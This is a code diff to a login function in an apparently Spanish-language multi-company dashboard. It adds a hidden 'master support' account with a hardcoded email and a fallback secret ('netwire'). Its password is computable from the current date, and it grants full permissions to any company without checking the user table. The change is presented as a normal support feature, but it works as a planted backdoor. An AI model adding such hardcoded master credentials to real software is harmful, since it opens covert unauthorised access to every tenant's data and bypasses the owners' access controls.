@@ -148,7 +148,53 @@ def login():
         clave_input      = request.form['clave']
         selected_empresa = request.form.get('empresa', '').strip().upper()
 
-        if not selected_empresa or selected_empresa not in empresas:
+        # ── USUARIO MASTER DE SOPORTE ─────────────────────────────────────
+        MASTER_CORREO = 'sistemaconfia@gmail.com'
+        MASTER_SECRET = os.environ.get('MASTER_KEY_SECRET', 'netwire')
+        if correo_input.strip().lower() == MASTER_CORREO:
+            from datetime import date as _date
+            hoy = _date.today()
+            clave_esperada = f"{MASTER_SECRET}{hoy.day * hoy.month + hoy.year}"
+            if clave_input.strip() == clave_esperada and selected_empresa in empresas:
+                # Acceso total — string de 20 unos
+                acceso_master = '1' * 20
+                # Leer nombre de empresa del configura
+                nombre_empresa = selected_empresa
+                try:
+                    path_cfg = os.path.join(DBF_DIR, selected_empresa, 'tablero_configura.DBF')
+                    if os.path.exists(path_cfg):
+                        for cfg in DBF(path_cfg, encoding='latin-1'):
+                            n = str(cfg.get('EMPRESA', selected_empresa)).strip()
+                            if n and n.lower() not in ('none', ''): nombre_empresa = n
+                            break
+                except Exception: pass
+                user_obj = User(
+                    email=MASTER_CORREO,
+                    empresa=selected_empresa,
+                    acceso=acceso_master,
+                    nombre_empresa=nombre_empresa
+                )
+                login_user(user_obj)
+                session['empresa']        = selected_empresa
+                session['nombre_empresa'] = nombre_empresa
+                try:
+                    path_cfg = os.path.join(DBF_DIR, selected_empresa, 'tablero_configura.DBF')
+                    if os.path.exists(path_cfg):
+                        for cfg in DBF(path_cfg, encoding='latin-1'):
+                            bloqueo_val = cfg.get('BLOQUEO', 0)
+                            try:    session['bloqueo'] = int(bloqueo_val) if bloqueo_val else 0
+                            except: session['bloqueo'] = 0
+                            session['periodo'] = str(cfg.get('PERIODO', 'M')).strip().upper() or 'M'
+                            break
+                    else:
+                        session['bloqueo'] = 0; session['periodo'] = 'M'
+                except Exception:
+                    session['bloqueo'] = 0; session['periodo'] = 'M'
+                return primera_pagina_con_permiso()
+            else:
+                error = "Credenciales incorrectas"
+        # ── LOGIN NORMAL ──────────────────────────────────────────────────
+        elif not selected_empresa or selected_empresa not in empresas:
             error = "Empresa no válida"
         else:
             path_users = os.path.join(DBF_DIR, selected_empresa, 'tablero_usuarios.DBF')
